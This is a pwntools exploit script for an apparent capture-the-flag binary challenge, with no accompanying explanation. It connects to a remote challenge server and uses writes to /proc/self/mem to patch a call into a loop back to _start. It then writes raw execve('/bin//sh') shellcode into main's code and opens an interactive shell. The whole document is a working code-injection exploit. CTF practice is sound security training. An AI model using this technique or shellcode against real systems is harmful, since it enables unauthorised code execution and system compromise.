from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("ctf.csd.lol", 8888)
# gdb.attach(p, 'break *main+276')

def write_to(offset, data):
    p.sendlineafter(b': ', b'/proc/self/mem')
    p.sendlineafter(b'offset: ', str(offset).encode())
    p.sendafter(b'data: ', data)

# originaly call puts@plt
tar = 0x00000000004013d8+1
# Changes it to calling _start
data = chr(0xd3)

shellcode = b'\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

write_to(tar, data)

tar2 = elf.symbols['main'] + 296

context.log_level = 'debug'
for i in range(len(shellcode)):
    write_to(tar2 + i, chr(shellcode[i]))

write_to(tar, chr(0x13))

p.interactive()
